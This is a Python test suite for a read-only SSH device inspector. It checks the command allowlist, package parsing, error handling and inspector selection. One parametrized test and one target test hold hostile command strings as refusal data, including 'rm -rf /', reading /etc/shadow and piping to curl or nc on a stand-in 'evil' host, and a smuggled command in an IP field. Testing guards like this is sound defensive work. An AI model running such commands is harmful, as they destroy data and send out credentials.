"""Read-only enforcement, output parsing, the registry, and the failure modes.

Fakes and recorded output only: CI needs no SSH server anywhere (AGENTS.md §43). The
credential-leak tests live next door in `test_ssh_inspector_secrets.py`.
"""

from __future__ import annotations

import inspect as inspect_module
from collections.abc import Mapping, Sequence
from datetime import UTC, datetime
from ipaddress import ip_address
from pathlib import Path
from uuid import UUID, uuid4

import paramiko
import pytest

from adapters.inspector import ssh as ssh_module
from adapters.inspector.commands import (
    ALLOWED_ARGUMENTS,
    ALLOWED_COMMAND_STRINGS,
    ALLOWED_VERBS,
    READ_COMMANDS,
    READABLE_PATHS,
    SHELL_METACHARACTERS,
    assert_read_only,
)
from adapters.inspector.parsing import (
    MAX_COMPONENTS,
    MAX_FIELD_LENGTH,
    os_component,
    parse_dpkg,
    parse_os_release,
    parse_rpm,
)
from adapters.inspector.registry import (
    CapabilityInspectorRegistry,
    RegistryEntry,
    speaks_ssh,
    ssh_entry,
)
from adapters.inspector.ssh import SSHInspector
from domain.errors import DependencyError, ValidationError
from domain.models import DeviceFingerprint, InspectionResult, VersionSource
from domain.ports import CredentialedInspector, InspectorRegistry
from domain.secret import Secret

TENANT = UUID("11111111-1111-1111-1111-111111111111")
RUN_ID = UUID("22222222-2222-2222-2222-222222222222")
NOW = datetime(2026, 8, 16, 12, 0, tzinfo=UTC)
TARGET = ip_address("10.10.5.7")

FIXTURES = Path(__file__).resolve().parent / "fixtures" / "ssh"


def fixture(name: str) -> str:
    return (FIXTURES / f"{name}.txt").read_text(encoding="utf-8")


class FakeSecrets:
    def resolve(self, tenant_id: UUID, ref: str) -> Secret:
        return Secret("irrelevant-here")


class ScriptedRunner:
    def __init__(
        self, outputs: Mapping[str, str] | None = None, raises: Exception | None = None
    ) -> None:
        self.outputs = outputs or {}
        self.raises = raises
        self.commands: list[str] = []
        self.usernames: list[str] = []

    def run(
        self,
        *,
        host: str,
        port: int,
        username: str,
        secret: Secret,
        commands: Sequence[str],
        timeout: float,
    ) -> Mapping[str, str]:
        self.commands.extend(commands)
        self.usernames.append(username)
        if self.raises is not None:
            raise self.raises
        return {command: self.outputs.get(command, "") for command in commands}


def debian_outputs() -> dict[str, str]:
    return {
        "dpkg -l": fixture("dpkg_l"),
        "cat /etc/os-release": fixture("os_release"),
        "uname -sr": "Linux 5.15.0-91-generic",
        "uname -n": "app-01",
        "rpm -qa": "",
    }


def inspector(runner: ScriptedRunner) -> SSHInspector:
    return SSHInspector(
        FakeSecrets(), run_id=RUN_ID, username="scanner", runner=runner, clock=lambda: NOW
    )


def inspect_with(outputs: Mapping[str, str]) -> InspectionResult:
    return inspector(ScriptedRunner(outputs)).inspect(TENANT, TARGET, "vault://ssh/app-01")


# ------------------------------------------------------------------- read-only


def test_the_adapter_only_ever_issues_allow_listed_commands() -> None:
    """The property, stated directly: whatever the device says or the network does, the
    only things sent are the constants in the allowlist (AGENTS.md §2.4)."""
    runner = ScriptedRunner(debian_outputs())

    inspector(runner).inspect(TENANT, TARGET, "vault://ssh/app-01")

    assert set(runner.commands) <= ALLOWED_COMMAND_STRINGS
    assert set(runner.commands) == {entry.command for entry in READ_COMMANDS}


@pytest.mark.parametrize("entry", READ_COMMANDS, ids=lambda e: e.kind)
def test_every_allow_listed_command_is_a_read(entry: object) -> None:
    """A command added to the list has to pass the same guard the existing ones do — the
    test that fails if someone adds a write."""
    assert_read_only(entry.command)  # type: ignore[attr-defined]
    verb = entry.command.split(" ", 1)[0]  # type: ignore[attr-defined]
    assert verb in ALLOWED_VERBS


@pytest.mark.parametrize(
    "hostile",
    [
        "rm -rf /",
        "dpkg -l; rm -rf /",
        "cat /etc/shadow && curl http://evil/",
        "cat /etc/os-release | nc evil 4444",
        "uname -sr `id`",
        "cat $(whoami)",
        "systemctl restart sshd",
        "sh -c 'echo pwned'",
        "dpkg --install /tmp/evil.deb",
        "cat /etc/os-release > /tmp/out",
        "echo pwned",
        "reboot",
    ],
)
def test_a_command_that_could_write_or_chain_is_refused(hostile: str) -> None:
    """The guard is what stops "just one more command" from becoming a write. Note that
    `dpkg --install` is refused by shape even though `dpkg` is an allowed verb."""
    with pytest.raises(ValueError, match=r"metacharacters|verb|may only be used|shape"):
        assert_read_only(hostile)


#: The complete set of things this scanner may ever say to a device it has logged into.
EXPECTED_COMMANDS = frozenset(
    {"cat /etc/os-release", "uname -sr", "uname -n", "dpkg -l", "rpm -qa"}
)


def test_the_allowlist_is_exactly_this_and_nothing_more() -> None:
    """A canary, and the reason it is here: the shape guard only rejects what
    `ALLOWED_ARGUMENTS` does not permit, so an author adding `dpkg --install` would widen
    both the map and the list in one edit and the guard would bless it. This assertion
    cannot be satisfied that way — widening what we may say to a device has to show up in
    a diff, on purpose, and be reviewed as the security change it is (AGENTS.md §2.4).
    """
    assert ALLOWED_COMMAND_STRINGS == EXPECTED_COMMANDS
    assert {
        f"{verb} {argument}"
        for verb, arguments in ALLOWED_ARGUMENTS.items()
        for argument in arguments
    } == EXPECTED_COMMANDS


def test_the_only_readable_path_is_os_release() -> None:
    """`cat` is a reading verb, but the path matters just as much: `cat /etc/shadow` is a
    read too."""
    assert set(READABLE_PATHS) == {"/etc/os-release"}


def test_no_allow_listed_command_contains_a_shell_metacharacter() -> None:
    for entry in READ_COMMANDS:
        assert not set(entry.command) & SHELL_METACHARACTERS


def test_no_command_is_ever_built_from_a_value() -> None:
    """There is no string formatting anywhere near a command: the commands are literals, so
    there is nothing for untrusted data to be interpolated into (AGENTS.md §2.9)."""
    source = (
        Path(__file__).resolve().parents[1] / "adapters" / "inspector" / "commands.py"
    ).read_text(encoding="utf-8")
    command_lines = [line for line in source.splitlines() if "command=" in line]

    assert command_lines
    for line in command_lines:
        assert 'f"' not in line
        assert ".format(" not in line
        assert " + " not in line
        assert "%" not in line


def test_the_transport_rechecks_the_allowlist_before_executing() -> None:
    """Defence in depth: even a runner handed a command from somewhere else re-validates it
    at the last possible moment."""
    source = inspect_module.getsource(ssh_module.ParamikoSSHRunner._execute)

    assert "assert_read_only(command)" in source


def test_the_transport_refuses_an_unknown_host_key() -> None:
    """Accepting an unknown key would mean handing a credential to whatever answered on
    that address — the SSH equivalent of turning off certificate validation."""
    source = inspect_module.getsource(ssh_module.ParamikoSSHRunner)

    assert "RejectPolicy" in source
    assert "AutoAddPolicy" not in source
    assert "WarningPolicy" not in source


def test_the_transport_disables_ambient_credentials() -> None:
    """No agent, no `~/.ssh`: an inspection cannot succeed by accident using the operator's
    own key instead of the vault's credential."""
    source = inspect_module.getsource(ssh_module.ParamikoSSHRunner)

    assert source.count("allow_agent=False") == 2  # both auth branches
    assert source.count("look_for_keys=False") == 2


# --------------------------------------------------------------------- parsing


def test_dpkg_output_yields_installed_packages_only() -> None:
    components = parse_dpkg(fixture("dpkg_l"))

    by_name = {component.name: component for component in components}
    assert by_name["apache2"].version == "2.4.52-1ubuntu4.9"
    assert by_name["openssl"].version == "3.0.2-0ubuntu1.18"
    assert by_name["libc6"].version == "2.35-0ubuntu3.8"  # `:amd64` is not identity
    assert "linux-image-generic" in by_name  # held packages are installed
    assert "nginx-common" not in by_name  # `rc` — removed, config left behind
    assert "half-configured-pkg" not in by_name  # `iU` — not actually installed


def test_every_parsed_component_says_where_its_version_came_from() -> None:
    """The whole point of credentialed inspection: this is ground truth, not a banner
    guess, and the downstream CVE matcher must be able to tell (AGENTS.md §3)."""
    for component in parse_dpkg(fixture("dpkg_l")):
        assert component.version_source is VersionSource.PACKAGE_MANAGER
        assert component.cpe is None  # CPE mapping is M3, not a guess made here


def test_rpm_output_is_split_into_name_and_version() -> None:
    by_name = {component.name: component for component in parse_rpm(fixture("rpm_qa"))}

    assert by_name["openssl"].version == "3.0.7-25.el9"
    assert by_name["python3-libs"].version == "3.9.18-1.el9"  # hyphenated name survives
    assert by_name["kernel"].version == "5.14.0-362.8.1.el9"
    assert "this-line-is-not-a-package" not in by_name


def test_os_release_is_parsed_into_the_operating_system_component() -> None:
    values = parse_os_release(fixture("os_release"))

    assert values["ID"] == "ubuntu"
    assert values["VERSION_ID"] == "22.04"
    assert values["PRETTY_NAME"] == "Ubuntu 22.04.4 LTS"  # quotes stripped

    component = os_component(values, "Linux 5.15.0-91-generic")
    assert component is not None
    assert (component.name, component.version) == ("ubuntu", "22.04")


def test_a_device_without_os_release_falls_back_to_the_kernel() -> None:
    """Stripped-down embedded systems often have no os-release at all."""
    component = os_component({}, "Linux 4.9.37")

    assert component is not None
    assert (component.name, component.version) == ("Linux", "4.9.37")


def test_hostile_output_is_capped_and_sanitized() -> None:
    """A device chooses what it says. Control characters are stripped, absurd fields are
    truncated, and a flood of lines stops at a bound rather than becoming memory pressure
    or thirty thousand rows."""
    components = parse_dpkg(fixture("dpkg_hostile"))

    assert len(components) <= MAX_COMPONENTS
    for component in components:
        assert len(component.name) <= MAX_FIELD_LENGTH
        assert component.name.isprintable()
        assert "\x1b" not in component.name
        assert "\x00" not in component.name
    assert any(component.name == "normal-package" for component in components)


def test_unparseable_lines_are_skipped_not_guessed() -> None:
    components = parse_dpkg("total nonsense\nii\nii  \n")

    assert components == []


# ---------------------------------------------------------------- normalization


def test_an_inspection_produces_provenance_complete_observations() -> None:
    result = inspect_with(debian_outputs())

    software = next(obs for obs in result.observations if obs.observation_type == "software")
    assert software.source == "ssh"
    assert software.source_type == "credentialed"
    assert software.collector == "ssh-inspector"
    assert software.collection_method == "ssh_read_only"
    assert software.version_source is VersionSource.PACKAGE_MANAGER
    assert software.source_identifier == "10.10.5.7"
    assert software.tenant_id == TENANT
    assert software.run_id == RUN_ID
    assert software.observed_at.tzinfo is not None
    assert software.collected_at == NOW
    assert software.asset_id is None  # the ingestion path resolves it (P8)


def test_the_operating_system_leads_the_component_list() -> None:
    result = inspect_with(debian_outputs())

    assert result.components[0].name == "ubuntu"
    assert {component.name for component in result.components} >= {"apache2", "openssl"}


def test_the_device_hostname_becomes_a_locator_not_an_identity() -> None:
    result = inspect_with(debian_outputs())

    assert [(anchor.kind, anchor.value) for anchor in result.anchors] == [("hostname", "app-01")]


def test_an_rpm_device_is_read_the_same_way() -> None:
    result = inspect_with(
        {
            "rpm -qa": fixture("rpm_qa"),
            "cat /etc/os-release": 'ID="rhel"\nVERSION_ID="9.3"\n',
            "uname -sr": "Linux 5.14.0",
            "uname -n": "db-01",
            "dpkg -l": "",
        }
    )

    assert result.components[0].name == "rhel"
    assert {component.name for component in result.components} >= {"httpd", "glibc"}


def test_a_device_that_answers_nothing_raises_rather_than_reporting_no_software() -> None:
    """ "No packages found" and "we could not read this device" must never be the same
    value: the first would quietly mark a device as clean (AGENTS.md §67)."""
    with pytest.raises(ValidationError, match="no usable output"):
        inspect_with(dict.fromkeys(ALLOWED_COMMAND_STRINGS, ""))


def test_a_target_that_is_not_an_address_is_refused() -> None:
    runner = ScriptedRunner(debian_outputs())
    hostile: object = "10.10.5.7; rm -rf /"

    with pytest.raises(ValidationError, match="not a valid IP address"):
        inspector(runner).inspect(TENANT, hostile, "vault://ssh/app-01")  # type: ignore[arg-type]

    assert runner.commands == []


def test_an_inspector_without_a_username_is_refused() -> None:
    """No default account: a credential with nothing to log in as is a configuration gap,
    not something to guess."""
    with pytest.raises(ValidationError, match="username"):
        SSHInspector(FakeSecrets(), run_id=RUN_ID, username="  ")


# ----------------------------------------------------------------- failure modes


@pytest.mark.parametrize(
    ("failure", "retryable", "match"),
    [
        (
            DependencyError("ssh connection to 10.10.5.7:22 failed: refused", retryable=True),
            True,
            "failed",
        ),
        (
            DependencyError("ssh authentication rejected by 10.10.5.7:22", retryable=False),
            False,
            "authentication rejected",
        ),
        (
            DependencyError("ssh connection to 10.10.5.7:22 timed out after 30.0s", retryable=True),
            True,
            "timed out",
        ),
    ],
    ids=["refused", "auth-failed", "timeout"],
)
def test_transport_failures_surface_with_the_right_retryable_flag(
    failure: DependencyError, retryable: bool, match: str
) -> None:
    """A refused connection or a timeout may work later; a rejected credential will not."""
    with pytest.raises(DependencyError, match=match) as exc_info:
        inspector(ScriptedRunner(raises=failure)).inspect(TENANT, TARGET, "vault://ssh/app-01")

    assert exc_info.value.retryable is retryable


def test_the_paramiko_runner_maps_authentication_failure_by_type_not_message() -> None:
    """An SSH library's auth message is the one place a credential could plausibly be
    echoed, so the error is built from the exception *type*."""
    source = inspect_module.getsource(ssh_module.ParamikoSSHRunner._authenticate)

    assert "paramiko.AuthenticationException" in source
    assert "type(exc).__name__" in source
    assert (
        "{exc}" not in source.split("except paramiko.AuthenticationException")[1].split("except")[0]
    )


def test_a_credential_that_is_not_a_usable_key_fails_clearly() -> None:
    with pytest.raises(DependencyError, match="not a usable SSH private key"):
        ssh_module._private_key("-----BEGIN OPENSSH PRIVATE KEY-----\nnot really\n")


# --------------------------------------------------------------------- registry


def make_registry(inspector_double: CredentialedInspector) -> CapabilityInspectorRegistry:
    return CapabilityInspectorRegistry([ssh_entry(inspector_double)])


def test_the_registry_selects_ssh_for_an_ssh_capable_device() -> None:
    ssh_inspector = inspector(ScriptedRunner(debian_outputs()))
    registry = make_registry(ssh_inspector)

    chosen = registry.for_device(
        DeviceFingerprint(
            target="10.10.5.7", open_ports=(22, 80), credential_ref="vault://ssh/app-01"
        )
    )

    assert chosen is ssh_inspector


def test_the_registry_selects_by_capability_not_by_brand() -> None:
    """An Axis camera that speaks SSH gets the SSH inspector; a device that does not, does
    not — and neither decision mentions a vendor (m1-design §1)."""
    ssh_inspector = inspector(ScriptedRunner(debian_outputs()))
    registry = make_registry(ssh_inspector)

    camera_with_ssh = DeviceFingerprint(
        target="10.10.5.31",
        open_ports=(22, 554),
        mac_vendor="Axis Communications AB",
        credential_ref="vault://ssh/cam",
    )
    camera_without_ssh = DeviceFingerprint(
        target="10.10.5.32",
        open_ports=(80, 554),
        mac_vendor="Axis Communications AB",
        credential_ref="vault://ssh/cam",
    )

    assert registry.for_device(camera_with_ssh) is ssh_inspector
    assert registry.for_device(camera_without_ssh) is None


def test_a_banner_is_enough_to_identify_the_capability() -> None:
    fingerprint = DeviceFingerprint(
        target="10.10.5.7",
        open_ports=(2022,),
        service_banners=("SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10",),
        credential_ref="vault://ssh/app-01",
    )

    assert speaks_ssh(fingerprint) is True


def test_no_credential_means_no_credentialed_path() -> None:
    """A legitimate answer, not a failure: the device stays uncredentialed and its
    observations keep `version_source='banner'` (m1-design §1). Guessing a credential is
    default-credential probing, which is out of scope."""
    registry = make_registry(inspector(ScriptedRunner(debian_outputs())))

    assert registry.for_device(DeviceFingerprint(target="10.10.5.7", open_ports=(22,))) is None


def test_a_more_specific_adapter_registered_first_wins() -> None:
    """The extension mechanism: a future VAPIX adapter registers ahead of generic SSH and
    takes the devices it understands, without any caller changing."""
    generic = inspector(ScriptedRunner(debian_outputs()))
    vendor_api = inspector(ScriptedRunner(debian_outputs()))
    registry = CapabilityInspectorRegistry(
        [
            RegistryEntry(
                name="vendor-api",
                # A capability question — "did the vendor API answer?" — not a brand test.
                matches=lambda fp: "_axis-video._tcp" in fp.mdns_services,
                inspector=vendor_api,
            ),
            ssh_entry(generic),
        ]
    )

    camera = DeviceFingerprint(
        target="10.10.5.31",
        open_ports=(22, 554),
        mdns_services=("_axis-video._tcp",),
        credential_ref="vault://api/cam",
    )
    server = DeviceFingerprint(
        target="10.10.5.7", open_ports=(22,), credential_ref="vault://ssh/app-01"
    )

    assert registry.for_device(camera) is vendor_api
    assert registry.for_device(server) is generic
    assert registry.registered == ("vendor-api", "generic-ssh")


# ------------------------------------------------------------------ conformance


def test_the_adapters_satisfy_their_ports() -> None:
    ssh_inspector: CredentialedInspector = SSHInspector(
        FakeSecrets(), run_id=uuid4(), username="scanner", runner=ScriptedRunner()
    )
    registry: InspectorRegistry = CapabilityInspectorRegistry([ssh_entry(ssh_inspector)])

    assert callable(ssh_inspector.inspect)
    assert callable(registry.for_device)


def test_the_real_transport_satisfies_the_runner_port() -> None:
    runner: ssh_module.SSHCommandRunner = ssh_module.ParamikoSSHRunner()

    assert callable(runner.run)
    assert paramiko.SSHClient is not None  # the dependency is real, not a stub
